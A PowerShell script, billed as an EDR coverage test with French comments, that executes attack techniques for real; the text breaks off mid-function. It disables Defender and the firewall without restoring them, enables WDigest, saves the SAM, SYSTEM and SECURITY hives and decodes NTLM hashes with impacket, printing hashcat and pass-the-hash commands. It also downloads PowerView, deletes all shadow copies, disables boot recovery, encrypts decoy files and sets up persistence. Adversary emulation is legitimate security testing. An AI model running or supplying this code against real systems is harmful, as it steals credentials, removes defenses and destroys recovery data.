# ============================================================
#  EDR TEST SCRIPT -- Standalone
#  Pour tester la couverture de detection de ton EDR
#  Usage: powershell -ep bypass -File edr_test.ps1
#  WARNING: Isolated lab environment only
# ============================================================

$Results = @()
$StartTime = Get-Date
$VictimDir = "$env:USERPROFILE\Documents\EDR_Test_$(Get-Date -Format 'yyyyMMdd_HHmm')"
New-Item -ItemType Directory -Force -Path $VictimDir | Out-Null

$LogFile = "$VictimDir\edr_test_verbose.log"

function Write-Log {
    param([string]$Text, [string]$Color = "White")
    $line = "[$(Get-Date -Format 'HH:mm:ss')] $Text"
    Add-Content -Path $LogFile -Value $line
    Write-Host $line -ForegroundColor $Color
}

function Write-Phase {
    param([string]$ID, [string]$Name)
    Write-Host ""
    Write-Host "=============================================" -ForegroundColor DarkCyan
    Write-Host "  [$ID] $Name" -ForegroundColor Cyan
    Write-Host "=============================================" -ForegroundColor DarkCyan
    Write-Log "=== PHASE $ID -- $Name ===" "Cyan"
}

function Write-Detail {
    param([string]$Text)
    Write-Host "      >> $Text" -ForegroundColor DarkGray
    Write-Log "      >> $Text"
}

function Write-Evidence {
    param([string]$Text)
    Write-Host "      [EVIDENCE] $Text" -ForegroundColor Yellow
    Write-Log "      [EVIDENCE] $Text"
}

function Write-Success {
    param([string]$Text)
    Write-Host "      [+] $Text" -ForegroundColor Green
    Write-Log "      [+] $Text"
}

function Write-Fail {
    param([string]$Text)
    Write-Host "      [-] $Text" -ForegroundColor Red
    Write-Log "      [-] $Text"
}

function Log-Result {
    param([string]$Technique, [string]$Description, [string]$Status, [string]$Detail = "")
    $obj = [PSCustomObject]@{
        Technique   = $Technique
        Description = $Description
        Status      = $Status
        Detail      = $Detail
        Timestamp   = Get-Date -Format "HH:mm:ss"
    }
    $script:Results += $obj
    $color = switch ($Status) {
        "EXECUTED" { "Yellow" }
        "BLOCKED"  { "Green"  }
        default    { "Gray"   }
    }
    Write-Host "  [$Status] $Technique -- $Description" -ForegroundColor $color
    Write-Log "  [$Status] $Technique -- $Description | $Detail"
}

# ============================================================
# T1082 -- SYSTEM INFORMATION DISCOVERY
# ============================================================
Write-Phase "T1082" "System Information Discovery"

Write-Detail "Running: Get-WmiObject Win32_ComputerSystem"
$cs  = Get-WmiObject Win32_ComputerSystem
Write-Detail "Running: Get-WmiObject Win32_OperatingSystem"
$os  = Get-WmiObject Win32_OperatingSystem
Write-Detail "Running: Get-NetIPAddress"
$ip  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress
Write-Detail "Running: Get-WmiObject Win32_BIOS"
$bios = Get-WmiObject Win32_BIOS

$sysinfo = [ordered]@{
    Hostname       = $env:COMPUTERNAME
    Username       = $env:USERNAME
    Domain         = $cs.Domain
    OS             = $os.Caption
    OS_Build       = $os.BuildNumber
    Architecture   = $os.OSArchitecture
    IP             = $ip -join ", "
    RAM_GB         = [math]::Round($cs.TotalPhysicalMemory / 1GB, 2)
    BIOS_Serial    = $bios.SerialNumber
    Last_Boot      = $os.ConvertToDateTime($os.LastBootUpTime)
    PowerShell_Ver = $PSVersionTable.PSVersion.ToString()
    Is_VM          = if ($cs.Model -match "Virtual|VMware|VBox") { "YES -- $($cs.Model)" } else { "No" }
}

Write-Host ""
Write-Evidence "=== SYSTEM RECON RESULTS ==="
$sysinfo.GetEnumerator() | ForEach-Object {
    Write-Evidence "  $($_.Key.PadRight(16)): $($_.Value)"
}

# Uptime
$uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime)
Write-Evidence "  Uptime          : $([math]::Floor($uptime.TotalHours))h $($uptime.Minutes)m"

Log-Result "T1082" "System info enumeration via WMI" "EXECUTED" "Host:$($env:COMPUTERNAME) User:$($env:USERNAME) OS:$($os.BuildNumber)"

# ============================================================
# T1057 -- PROCESS DISCOVERY + EDR FINGERPRINT
# ============================================================
Write-Phase "T1057" "Process Discovery + EDR Fingerprint"

Write-Detail "Running: Get-Process (all processes)"
$allProcs = Get-Process
Write-Evidence "Total running processes: $($allProcs.Count)"

Write-Detail "Top 10 processes by memory usage:"
$top10 = $allProcs | Sort-Object WorkingSet -Descending | Select-Object -First 10
$top10 | ForEach-Object {
    Write-Evidence "  PID $($_.Id.ToString().PadLeft(6)) | $($_.Name.PadRight(30)) | RAM: $([math]::Round($_.WorkingSet/1MB,1)) MB"
}

$edrMap = @{
    "MsMpEng"            = "Windows Defender"
    "SenseIR"            = "Microsoft Defender for Endpoint"
    "CSFalconService"    = "CrowdStrike Falcon"
    "CSAgent"            = "CrowdStrike Falcon Agent"
    "SentinelAgent"      = "SentinelOne"
    "SentinelServiceHost"= "SentinelOne Service"
    "cb"                 = "Carbon Black"
    "CarbonBlack"        = "Carbon Black"
    "bdagent"            = "Bitdefender"
    "bdredline"          = "Bitdefender RedLine"
    "cylancesvc"         = "Cylance"
    "xagt"               = "FireEye"
    "mbam"               = "Malwarebytes"
}

Write-Host ""
Write-Detail "Scanning for known EDR/AV processes..."
$foundEDR = $false
foreach ($proc in $edrMap.GetEnumerator()) {
    $running = Get-Process $proc.Key -ErrorAction SilentlyContinue
    if ($running) {
        Write-Evidence "  [EDR FOUND] $($proc.Value) -- Process: $($proc.Key).exe -- PID: $($running.Id)"
        $foundEDR = $true
    }
}
if (-not $foundEDR) {
    Write-Evidence "  No known EDR process detected in process list"
}

Log-Result "T1057" "Process enumeration + EDR fingerprint" "EXECUTED" "Total procs: $($allProcs.Count) | EDR found: $foundEDR"

# ============================================================
# T1016 -- NETWORK DISCOVERY
# ============================================================
Write-Phase "T1016" "Network Configuration Discovery"

Write-Detail "Running: ipconfig /all"
$ipcfg = ipconfig /all
Write-Evidence "ipconfig /all output (first 10 lines):"
$ipcfg | Select-Object -First 10 | ForEach-Object { Write-Evidence "  $_" }

Write-Detail "Running: Get-NetTCPConnection (active connections)"
$conns = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue
Write-Evidence "Active TCP connections: $($conns.Count)"
$conns | Select-Object -First 8 | ForEach-Object {
    Write-Evidence "  $($_.LocalAddress):$($_.LocalPort) --> $($_.RemoteAddress):$($_.RemotePort) [$($_.State)]"
}

Write-Detail "Running: Get-NetRoute (routing table)"
$routes = Get-NetRoute -AddressFamily IPv4 -ErrorAction SilentlyContinue
Write-Evidence "IPv4 Routes: $($routes.Count) entries"
$routes | Where-Object { $_.NextHop -ne "0.0.0.0" } | Select-Object -First 5 | ForEach-Object {
    Write-Evidence "  $($_.DestinationPrefix) via $($_.NextHop)"
}

Write-Detail "Running: Get-DnsClientCache"
$dns = Get-DnsClientCache -ErrorAction SilentlyContinue
Write-Evidence "DNS Cache entries: $($dns.Count)"

Log-Result "T1016" "ipconfig + TCP connections + routing table + DNS cache" "EXECUTED" "Connections: $($conns.Count) | Routes: $($routes.Count)"

# ============================================================
# T1562 -- IMPAIR DEFENSES
# ============================================================
Write-Phase "T1562" "Impair Defenses -- Disable Windows Defender"

Write-Detail "Checking current Defender status before modification..."
Try {
    $defBefore = Get-MpPreference -ErrorAction Stop
    Write-Evidence "Defender RealTime BEFORE : $($defBefore.DisableRealtimeMonitoring)"
    Write-Evidence "Defender Behavior BEFORE : $($defBefore.DisableBehaviorMonitoring)"
    Write-Evidence "Defender Script   BEFORE : $($defBefore.DisableScriptScanning)"
} Catch {
    Write-Evidence "Could not read Defender preferences: $($_.Exception.Message)"
}

Write-Detail "Attempting: Set-MpPreference -DisableRealtimeMonitoring `$true"
Try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
    $defAfter = Get-MpPreference
    Write-Evidence "Defender RealTime AFTER  : $($defAfter.DisableRealtimeMonitoring)"
    if ($defAfter.DisableRealtimeMonitoring -eq $true) {
        Write-Success "Realtime monitoring successfully DISABLED -- EDR did NOT block this"
        Log-Result "T1562" "Disable Defender realtime monitoring" "EXECUTED" "DisableRealtimeMonitoring = True confirmed"
    } else {
        Write-Fail "Setting did not apply -- tamper protection active"
        Log-Result "T1562" "Disable Defender realtime monitoring" "BLOCKED" "Value unchanged after Set-MpPreference"
    }
} Catch {
    Write-Fail "Exception: $($_.Exception.Message)"
    Log-Result "T1562" "Disable Defender realtime monitoring" "BLOCKED" $_.Exception.Message
}

Write-Detail "Attempting: netsh advfirewall set allprofiles state off"
$fwResult = netsh advfirewall set allprofiles state off 2>&1
Write-Evidence "Firewall result: $fwResult"
$fwCheck = netsh advfirewall show allprofiles state 2>&1
Write-Evidence "Firewall status after: $($fwCheck -join ' | ')"
if ($fwCheck -match "OFF") {
    Write-Success "Firewall disabled successfully"
    Log-Result "T1562" "Disable Windows Firewall via netsh" "EXECUTED" "All profiles = OFF confirmed"
} else {
    Log-Result "T1562" "Disable Windows Firewall via netsh" "BLOCKED" "Firewall still ON"
}

# ============================================================
# T1003 -- CREDENTIAL DUMPING
# ============================================================
Write-Phase "T1003" "Credential Dumping Simulation"

Write-Detail "Attempting: reg add WDigest UseLogonCredential=1"
$wdResult = reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f 2>&1
Write-Evidence "reg add result: $wdResult"

Write-Detail "Verifying WDigest registry value..."
$wdCheck = reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential 2>&1
Write-Evidence "WDigest registry check:"
$wdCheck | ForEach-Object { Write-Evidence "  $_" }
if ($wdCheck -match "0x1") {
    Write-Success "WDigest UseLogonCredential = 1 confirmed -- cleartext creds will cache on next logon"
    Log-Result "T1003" "Enable WDigest cleartext credential caching" "EXECUTED" "HKLM WDigest UseLogonCredential=1 verified"
} else {
    Log-Result "T1003" "Enable WDigest cleartext credential caching" "BLOCKED" "Registry value not set"
}

Write-Detail "Attempting to access LSASS process..."
Try {
    $lsass = Get-Process lsass -ErrorAction Stop
    Write-Evidence "LSASS process found:"
    Write-Evidence "  PID          : $($lsass.Id)"
    Write-Evidence "  Working Set  : $([math]::Round($lsass.WorkingSet/1MB,1)) MB"
    Write-Evidence "  Start Time   : $($lsass.StartTime)"
    Write-Evidence "  Handle Count : $($lsass.HandleCount)"
    Write-Success "LSASS process accessible (PID $($lsass.Id)) -- EDR should alert on this"
    Log-Result "T1003" "LSASS process read access (T1003.001)" "EXECUTED" "PID:$($lsass.Id) Handles:$($lsass.HandleCount)"
} Catch {
    Write-Fail "LSASS access denied: $($_.Exception.Message)"
    Log-Result "T1003" "LSASS process read access" "BLOCKED" $_.Exception.Message
}

Write-Detail "Attempting: reg save HKLM\SAM to disk"
$samPath = "$env:TEMP\sam_$(Get-Random).tmp"
$samResult = reg save HKLM\SAM $samPath /y 2>&1
Write-Evidence "reg save SAM result: $samResult"
if (Test-Path $samPath) {
    $samSize = (Get-Item $samPath).Length
    Write-Success "SAM hive saved to disk! Size: $samSize bytes -- CRITICAL IOC"
    Log-Result "T1003" "SAM hive dump via reg save" "EXECUTED" "File: $samPath Size: $samSize bytes"
    Remove-Item $samPath -Force
} else {
    Write-Fail "SAM dump blocked -- could not write to $samPath"
    Log-Result "T1003" "SAM hive dump via reg save" "BLOCKED" "reg save returned: $samResult"
}

# ============================================================
# T1555 -- BROWSER CREDENTIALS
# ============================================================
Write-Phase "T1555" "Browser Credential Access"

$browsers = @(
    @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
    @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
    @{Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"},
    @{Name="Firefox"; Path="$env:APPDATA\Mozilla\Firefox\Profiles"}
)

foreach ($b in $browsers) {
    Write-Detail "Checking $($b.Name): $($b.Path)"
    if (Test-Path $b.Path) {
        $item = Get-Item $b.Path
        Write-Evidence "  $($b.Name) credential store FOUND"
        Write-Evidence "  Path     : $($b.Path)"
        Write-Evidence "  Modified : $($item.LastWriteTime)"
        if ($item -is [System.IO.FileInfo]) {
            Write-Evidence "  Size     : $($item.Length) bytes"
            Write-Success "$($b.Name) Login Data accessible -- attacker could copy + decrypt"
        } else {
            $profileCount = (Get-ChildItem $b.Path -Directory).Count
            Write-Evidence "  Profiles : $profileCount"
            Write-Success "$($b.Name) profiles accessible"
        }
        Log-Result "T1555" "$($b.Name) credential store accessed" "EXECUTED" "Path: $($b.Path)"
    } else {
        Write-Evidence "  $($b.Name): Not installed or path not found"
        Log-Result "T1555" "$($b.Name) credential store" "NOT_FOUND" $b.Path
    }
}

# ============================================================
# T1027 -- OBFUSCATION / ENCODED COMMAND
# ============================================================
Write-Phase "T1027" "Defense Evasion -- Encoded PowerShell"

$plainCmd = "Write-Host 'T1027 EXECUTED -- Encoded payload ran successfully'; Get-Date"
$encoded  = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($plainCmd))

Write-Detail "Original command  : $plainCmd"
Write-Detail "Base64 encoded    : $encoded"
Write-Detail "Executing via     : powershell.exe -EncodedCommand <payload>"

$encResult = powershell -EncodedCommand $encoded 2>&1
Write-Evidence "Encoded command output: $encResult"
if ($encResult -match "EXECUTED") {
    Write-Success "EncodedCommand executed successfully -- EDR should flag -EncodedCommand with PowerShell"
    Log-Result "T1027" "Encoded PowerShell via -EncodedCommand" "EXECUTED" "Output: $encResult"
} else {
    Log-Result "T1027" "Encoded PowerShell via -EncodedCommand" "BLOCKED" "No output returned"
}

# ============================================================
# T1105 -- INGRESS TOOL TRANSFER
# ============================================================
Write-Phase "T1105" "Ingress Tool Transfer -- Suspicious Download"

$downloads = @(
    @{
        Name = "PowerSploit PowerView"
        URL  = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
    },
    @{
        Name = "Mimikatz release page"
        URL  = "https://github.com/gentilkiwi/mimikatz/releases/latest"
    }
)

foreach ($dl in $downloads) {
    Write-Detail "Attempting download: $($dl.Name)"
    Write-Detail "URL: $($dl.URL)"
    Try {
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        $resp = Invoke-WebRequest -Uri $dl.URL -Method GET -TimeoutSec 10 -ErrorAction Stop -UseBasicParsing
        $sw.Stop()
        Write-Evidence "  HTTP Status  : $($resp.StatusCode)"
        Write-Evidence "  Content-Type : $($resp.Headers['Content-Type'])"
        Write-Evidence "  Size         : $($resp.Content.Length) bytes"
        Write-Evidence "  Time         : $($sw.ElapsedMilliseconds) ms"
        Write-Success "Download SUCCEEDED -- EDR should flag suspicious URL + PowerShell web request"
        Log-Result "T1105" "Download: $($dl.Name)" "EXECUTED" "HTTP $($resp.StatusCode) | $($resp.Content.Length) bytes"
    } Catch {
        Write-Fail "Download blocked/failed: $($_.Exception.Message)"
        Log-Result "T1105" "Download: $($dl.Name)" "BLOCKED" $_.Exception.Message
    }
}

# ============================================================
# T1490 -- INHIBIT SYSTEM RECOVERY
# ============================================================
Write-Phase "T1490" "Inhibit System Recovery"

Write-Detail "Listing existing shadow copies..."
$vssBefore = vssadmin list shadows 2>&1
Write-Evidence "Shadow copies before:"
$vssBefore | ForEach-Object { Write-Evidence "  $_" }

Write-Detail "Running: vssadmin delete shadows /all /quiet"
$vssResult = vssadmin delete shadows /all /quiet 2>&1
Write-Evidence "vssadmin result: $vssResult"

$vssAfter = vssadmin list shadows 2>&1
Write-Evidence "Shadow copies after: $($vssAfter -join ' ')"
if ($vssAfter -match "No items") {
    Write-Success "Shadow copies deleted (or none existed) -- recovery inhibited"
    Log-Result "T1490" "VSS shadow copy deletion" "EXECUTED" "vssadmin delete shadows /all"
} else {
    Log-Result "T1490" "VSS shadow copy deletion" "BLOCKED" "Shadows still present"
}

Write-Detail "Running: bcdedit /set {default} recoveryenabled No"
Try {
    $bcdResult = bcdedit /set "{default}" recoveryenabled No 2>&1
    Write-Evidence "bcdedit result: $bcdResult"
    $bcdCheck  = bcdedit /enum "{default}" 2>&1 | Select-String "recoveryenabled"
    Write-Evidence "bcdedit verify : $bcdCheck"
    if ($bcdResult -match "successfully") {
        Write-Success "Windows Recovery disabled via bcdedit"
        Log-Result "T1490" "Disable Windows Recovery via bcdedit" "EXECUTED" "recoveryenabled: No confirmed"
    } else {
        Log-Result "T1490" "Disable Windows Recovery via bcdedit" "BLOCKED" "$bcdResult"
    }
} Catch {
    Log-Result "T1490" "bcdedit recovery disable" "BLOCKED" $_.Exception.Message
}

# ============================================================
# T1486 -- FILE ENCRYPTION SIMULATION
# ============================================================
Write-Phase "T1486" "Data Encrypted for Impact -- Simulation"

$testDir = "$VictimDir\victim_files"
New-Item -ItemType Directory -Force -Path $testDir | Out-Null

Write-Detail "Creating victim files in $testDir ..."
$fileContents = @{
    "rapport_financier_Q1.txt" = "RAPPORT FINANCIER Q1 2024`nRevenu Total: 4,250,000`$`nDepenses: 2,100,000`$`nMarge nette: 18.3%`nCONFIDENTIEL"
    "liste_clients.csv"        = "Nom,Email,Telephone,CA_Annuel`nTremblay Jean,jean@corp.com,514-555-0101,250000`nLeblanc Marie,marie@corp.com,438-555-0202,180000"
    "credentials_serveurs.txt" = "SERVEURS PRODUCTION`nSRV-PROD-01: admin / P@ssw0rd2024!`nSRV-DB-02: sa / Sql`$ecret99`nVPN: user / Winter2024#"
    "plan_strategique_2024.txt"= "PLAN STRATEGIQUE CONFIDENTIEL`nAcquisition cible: CompetitorCo`nBudget: 12M`$`nTimeline: Q3 2024"
    "backup_keys.txt"          = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE`nAWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
}

foreach ($f in $fileContents.GetEnumerator()) {
    Set-Content "$testDir\$($f.Key)" $f.Value
    Write-Evidence "  Created: $($f.Key) ($((Get-Item "$testDir\$($f.Key)").Length) bytes)"
}

Write-Host ""
Write-Detail "Starting XOR encryption on victim files..."
$key     = [byte]0x42
$count   = 0
$totalBytes = 0

Get-ChildItem $testDir -File | ForEach-Object {
    $original  = $_.FullName
    $encrypted = $_.FullName + ".locked"
    $bytes     = [System.IO.File]::ReadAllBytes($original)
    $enc       = $bytes | ForEach-Object { $_ -bxor $key }
    [System.IO.File]::WriteAllBytes($encrypted, $enc)
    Remove-Item $original -Force
    $count++
    $totalBytes += $bytes.Length
    Write-Evidence "  ENCRYPTED: $($_.Name) --> $($_.Name).locked ($($bytes.Length) bytes)"
}

Write-Host ""
if ($count -gt 0) {
    Write-Success "$count files encrypted ($totalBytes bytes total) -- .locked extension added"
    Write-Evidence "Encrypted files in $testDir :"
    Get-ChildItem $testDir | ForEach-Object { Write-Evidence "  $($_.Name)" }
    Log-Result "T1486" "File encryption simulation" "EXECUTED" "$count files | $totalBytes bytes | dir: $testDir"
} else {
    Log-Result "T1486" "File encryption simulation" "BLOCKED" "No files encrypted"
}

# ============================================================
# T1547 -- PERSISTENCE
# ============================================================
Write-Phase "T1547" "Persistence -- Autostart Execution"

# Registry Run Key
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "EDR_Test_WindowsUpdate"
$regVal  = "powershell -w hidden -nop -ep bypass -c `"Write-Host 'Persistence test'`""

Write-Detail "Attempting: Set-ItemProperty on HKCU Run key"
Write-Detail "Key   : $regPath"
Write-Detail "Name  : $regName"
Write-Detail "Value : $regVal"

Try {
    Set-ItemProperty -Path $regPath -Name $regName -Value $regVal -ErrorAction Stop
    $verify = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction Stop
    Write-Evidence "Registry key written:"
    Write-Evidence "  Path  : $regPath"
    Write-Evidence "  Name  : $($regName)"
    Write-Evidence "  Value : $($verify.$regName)"
    Write-Success "Run key persistence CONFIRMED -- will execute at next user logon"
    Log-Result "T1547" "Registry HKCU Run key persistence" "EXECUTED" "Key: $regName verified in registry"
    Remove-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
    Write-Detail "Cleanup: Run key removed"
} Catch {
    Write-Fail "Registry Run key blocked: $($_.Exception.Message)"
    Log-Result "T1547" "Registry HKCU Run key persistence" "BLOCKED" $_.Exception.Message
}

# Scheduled Task
Write-Detail "Attempting: schtasks /create (persistence via scheduled task)"
$taskName = "EDR_Test_WindowsUpdate_$(Get-Random -Maximum 9999)"
$taskResult = schtasks /create /tn $taskName /tr "powershell -w hidden -c exit" /sc onlogon /f 2>&1
Write-Evidence "schtasks create result: $taskResult"

$taskCheck = schtasks /query /tn $taskName 2>&1
Write-Evidence "schtasks query result: $($taskCheck -join ' | ')"
if ($taskCheck -notmatch "ERROR") {
    Write-Success "Scheduled task created and verified -- runs at logon"
    Log-Result "T1547" "Scheduled Task persistence (onlogon)" "EXECUTED" "Task: $taskName confirmed"
    schtasks /delete /tn $taskName /f 2>$null | Out-Null
    Write-Detail "Cleanup: Scheduled task deleted"
} else {
    Log-Result "T1547" "Scheduled Task persistence" "BLOCKED" "$taskResult"
}

# Startup Folder
$startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$startupFile = "$startupDir\EDR_Test_$(Get-Random).bat"
Write-Detail "Attempting: Write to Startup folder"
Write-Detail "Path: $startupFile"
Try {
    "@echo off`r`npowershell -w hidden -c exit" | Set-Content $startupFile -ErrorAction Stop
    if (Test-Path $startupFile) {
        Write-Evidence "Startup folder file created: $startupFile"
        Write-Evidence "File size: $((Get-Item $startupFile).Length) bytes"
        Write-Success "Startup folder persistence CONFIRMED"
        Log-Result "T1547" "Startup folder .bat persistence" "EXECUTED" "File: $startupFile"
        Remove-Item $startupFile -Force
        Write-Detail "Cleanup: Startup file removed"
    }
} Catch {
    Log-Result "T1547" "Startup folder persistence" "BLOCKED" $_.Exception.Message
}

# ============================================================
# RAPPORT FINAL
# ============================================================
$EndTime  = Get-Date
$Duration = ($EndTime - $StartTime).TotalSeconds

Write-Host ""
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "  EDR TEST -- FINAL REPORT" -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host ""

$executed  = ($Results | Where-Object { $_.Status -eq "EXECUTED" }).Count
$blocked   = ($Results | Where-Object { $_.Status -eq "BLOCKED" }).Count
$notFound  = ($Results | Where-Object { $_.Status -eq "NOT_FOUND" }).Count
$total     = $Results.Count
$score     = if ($total -gt 0) { [math]::Round(($blocked / $total) * 100, 1) } else { 0 }

Write-Host "  Duration          : $([math]::Round($Duration,1)) seconds" -ForegroundColor White
Write-Host "  Total tests       : $total" -ForegroundColor White
Write-Host "  EXECUTED          : $executed  (not blocked by EDR)" -ForegroundColor Yellow
Write-Host "  BLOCKED           : $blocked  (detected/prevented)" -ForegroundColor Green
Write-Host "  NOT_FOUND         : $notFound" -ForegroundColor Gray
Write-Host ""

$scoreColor = if ($score -ge 80) { "Green" } elseif ($score -ge 50) { "Yellow" } else { "Red" }
Write-Host "  EDR Coverage Score: $score%" -ForegroundColor $scoreColor
Write-Host ""

Write-Host "  Detailed Results:" -ForegroundColor Cyan
$Results | Format-Table Technique, Description, Status, Timestamp -AutoSize

$csvPath = "$VictimDir\edr_test_results_$(Get-Date -Format 'yyyyMMdd_HHmm').csv"
$Results | Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8

Write-Host "  Verbose log : $LogFile" -ForegroundColor Cyan
Write-Host "  CSV report  : $csvPath" -ForegroundColor Cyan
Write-Host ""
Write-Host "=============================================" -ForegroundColor Cyan

# ============================================================
#  SAM DUMP PAR USER -- T1003.002
#  Necessite: SAM + SYSTEM hives + pypykatz ou impacket
#  Methode: dump les deux hives, parse avec Python inline
# ============================================================

function Invoke-SamDump {
    Write-Phase "T1003.002" "SAM Dump -- Local Account Hashes by User"

    $samPath    = "$env:TEMP\sam_$(Get-Random).tmp"
    $systemPath = "$env:TEMP\system_$(Get-Random).tmp"
    $secPath    = "$env:TEMP\security_$(Get-Random).tmp"

    # -- Dump les 3 hives necessaires --
    Write-Detail "Dumping SAM hive    : reg save HKLM\SAM"
    $r1 = reg save HKLM\SAM $samPath /y 2>&1
    Write-Evidence "SAM    result : $r1"

    Write-Detail "Dumping SYSTEM hive : reg save HKLM\SYSTEM"
    $r2 = reg save HKLM\SYSTEM $systemPath /y 2>&1
    Write-Evidence "SYSTEM result : $r2"

    Write-Detail "Dumping SECURITY hive: reg save HKLM\SECURITY"
    $r3 = reg save HKLM\SECURITY $secPath /y 2>&1
    Write-Evidence "SECURITY result: $r3"

    if (-not (Test-Path $samPath) -or -not (Test-Path $systemPath)) {
        Write-Fail "Hive dump failed -- requires SYSTEM privileges (run as admin)"
        Log-Result "T1003.002" "SAM + SYSTEM hive dump" "BLOCKED" "Could not save hives -- need SYSTEM privs"
        return
    }

    $samSize    = (Get-Item $samPath).Length
    $systemSize = (Get-Item $systemPath).Length
    Write-Success "Hives dumped successfully:"
    Write-Evidence "  SAM    : $samPath ($samSize bytes)"
    Write-Evidence "  SYSTEM : $systemPath ($systemSize bytes)"

    # -- Methode 1: Impacket secretsdump via Python (si disponible) --
    Write-Detail "Checking for Python + impacket..."
    $python = Get-Command python -ErrorAction SilentlyContinue
    if (-not $python) { $python = Get-Command python3 -ErrorAction SilentlyContinue }

    if ($python) {
        Write-Evidence "Python found: $($python.Source)"

        # Verifier impacket
        $hasImpacket = python -c "import impacket; print(impacket.__version__)" 2>&1
        if ($hasImpacket -notmatch "Error") {
            Write-Success "impacket found: $hasImpacket"
            Write-Detail "Running secretsdump.py LOCAL mode on hives..."

            $secretsScript = @"
from impacket.examples.secretsdump import LocalOperations, SAMHashes
from impacket.examples import logger
import sys

samFile    = sys.argv[1]
systemFile = sys.argv[2]

try:
    localOps = LocalOperations(systemFile)
    bootKey  = localOps.getBootKey()
    print(f"[+] BootKey (syskey): {bootKey.hex()}")
    print("")

    samHashes = SAMHashes(samFile, bootKey, isRemote=False)
    samHashes.dump()
    samHashes.export('sam_output')
except Exception as e:
    print(f"[-] Error: {e}")
"@
            $pyScript = "$env:TEMP\sam_parse.py"
            Set-Content $pyScript $secretsScript -Encoding UTF8

            Write-Host ""
            Write-Host "  ============== SAM HASH DUMP ==============" -ForegroundColor Red
            $dumpOutput = python $pyScript $samPath $systemPath 2>&1
            $dumpOutput | ForEach-Object {
                if ($_ -match ":::") {
                    # Format: user:RID:LMhash:NThash:::
                    $parts = $_ -split ":"
                    if ($parts.Count -ge 4) {
                        Write-Host ""
                        Write-Host "  [USER]     $($parts[0])" -ForegroundColor Yellow
                        Write-Host "  [RID]      $($parts[1])" -ForegroundColor White
                        Write-Host "  [LM Hash]  $($parts[2])" -ForegroundColor DarkGray
                        Write-Host "  [NT Hash]  $($parts[3])" -ForegroundColor Red
                        Write-Host "  [Crack]    hashcat -m 1000 '$($parts[3])' rockyou.txt" -ForegroundColor Cyan
                        Write-Host "  [PTH]      pth-winexe -U '$($parts[0])%$($parts[3])' //TARGET cmd" -ForegroundColor Cyan
                        Write-Host ""
                        Write-Evidence "User: $($parts[0]) | RID: $($parts[1]) | NTLM: $($parts[3])"
                    }
                } elseif ($_ -match "BootKey|Error") {
                    Write-Host "  $_" -ForegroundColor DarkYellow
                }
            }
            Write-Host "  ===========================================" -ForegroundColor Red

            Log-Result "T1003.002" "SAM hash dump via impacket secretsdump" "EXECUTED" "Hashes extracted per user"
            Remove-Item $pyScript -Force -ErrorAction SilentlyContinue

        } else {
            Write-Fail "impacket not found -- trying PowerShell native parse..."
            Invoke-SamParsePowerShell -SamPath $samPath -SystemPath $systemPath
        }
    } else {
        Write-Fail "Python not found -- trying PowerShell native parse..."
        Invoke-SamParsePowerShell -SamPath $samPath -SystemPath $systemPath
    }

    # Cleanup
    Remove-Item $samPath    -Force -ErrorAction SilentlyContinue
    Remove-Item $systemPath -Force -ErrorAction SilentlyContinue
    Remove-Item $secPath    -Force -ErrorAction SilentlyContinue
    Write-Detail "Cleanup: hive files removed"
}

function Invoke-SamParsePowerShell {
    param([string]$SamPath, [string]$SystemPath)

    # -- Methode 2: PowerShell pur -- lit les users locaux via WMI/CIM --
    # Sans decryptage (necessite syskey), mais liste les comptes + metadata
    Write-Detail "Fallback: enumerating local accounts via WMI/CIM..."

    Write-Host ""
    Write-Host "  ============== LOCAL ACCOUNTS ==============" -ForegroundColor Red

    $users = Get-LocalUser -ErrorAction SilentlyContinue
    if (-not $users) {
        $users = Get-WmiObject Win32_UserAccount -Filter "LocalAccount=True" -ErrorAction SilentlyContinue
    }

    if ($users) {
        foreach ($u in $users) {
            $sid     = if ($u.SID) { $u.SID } else { $u.SID }
            $enabled = if ($u.Enabled -ne $null) { $u.Enabled } else { "Unknown" }
            $lastPwd = if ($u.PasswordLastSet) { $u.PasswordLastSet } else { "Never/Unknown" }

            Write-Host ""
            Write-Host "  [USER]           $($u.Name)" -ForegroundColor Yellow
            Write-Host "  [SID]            $sid" -ForegroundColor White
            Write-Host "  [Enabled]        $enabled" -ForegroundColor White
            Write-Host "  [Password Last]  $lastPwd" -ForegroundColor White
            Write-Host "  [Description]    $($u.Description)" -ForegroundColor DarkGray

            # Chercher le RID dans le SID (derniere partie)
            $rid = ($sid -split "-")[-1]
            Write-Host "  [RID]            $rid" -ForegroundColor White
            Write-Host "  [NT Hash]        [requires SYSTEM + syskey decryption]" -ForegroundColor DarkRed
            Write-Host "  [Crack cmd]      python secretsdump.py -sam sam.tmp -system system.tmp LOCAL" -ForegroundColor Cyan
            Write-Host ""

            Write-Evidence "User: $($u.Name) | SID: $sid | RID: $rid | Enabled: $enabled"
        }

        Write-Host "  [NOTE] To get actual NTLM hashes from SAM hives, run on Kali:" -ForegroundColor DarkYellow
